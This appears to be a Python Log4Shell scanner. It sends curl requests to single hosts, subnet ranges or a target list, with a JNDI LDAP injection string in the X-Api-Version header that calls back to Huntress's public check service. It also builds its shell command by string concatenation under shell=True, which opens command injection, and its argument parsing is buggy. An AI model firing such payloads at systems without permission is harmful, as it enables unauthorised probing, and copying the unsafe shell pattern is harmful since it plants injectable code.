#!/usr/bin/env python
import os
import sys
import time
import subprocess

check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
targets_txt = "targets.txt"

def scan(args):
    targets = []

    if len(args) < 1:
        if os.path.getsize(targets_txt) > 0:
            with open(targets_txt, 'r', encoding='utf8') as f:
                targets.extend(f.read().splitlines())

    if len(args) == 1:
        target = ''.join(args)
        targets.append(target)

    if "-" in args:
        end_address = args.split()[2]
        port = args.split()[0].split(":")[1]
        network_address = args.split()[0].split(".")
        network_address.pop(3)
        network_address = '.'.join(network_address)
        for i in range(int(end_address)):
            targets.append(f"{network_address}.{(str(i+1))}:{port}")

    if "--help" in args:
        usage_single = "Usage IP:     python3 scan.py 192.168.0.1:8080"
        usage_multi = "Usage Subnet: python3 scan.py 192.168.0.1:8080 - 254"
        usage_txt = "Usage txt:    please fill the txt file per line like 192.168.0.1:8080"
        print(f"{usage_single}\n{usage_multi}\n{usage_txt}")
        return

    # Checking Targets
    for target in targets:
        # Calculate full subnet
        subnet_args = target.split()
        if len(subnet_args) > 2:
            for i in range(int(subnet_args[2])):
                start_ip = subnet_args[0].split(".")
                print(start_ip)
                start_network = subnet_args[0].split(".")
                start_port = subnet_args[0].split(":")[1]
                if len(args) < 1:
                    start_network.pop()
                start_network.append(str(i + 1) + ":" + str(start_port))
                current_ip = '.'.join(start_network)
                targets.append(current_ip)
        try:
            timeout = 5
            bashCommand = "curl " + f"{target} " + "-k -m " + f"{timeout} " + f"-H 'X-Api-Version: {check_url}'"
            print("trying: " +  bashCommand)
            subprocess.call(bashCommand, timeout=timeout, shell=True)
        except:
            pass

    # Result URL
    result_guid = check_url.replace("${jndi:ldap://log4shell.huntress.com:1389/", "").replace("}","")
    result_url = "https://log4shell.huntress.com/view/" + result_guid
    print("\npleasecheck: " + result_url )

if __name__ == '__main__':
    args = sys.argv[1:]
    if len(args) > 1:
        args = " ".join(args)
    scan(args)
    


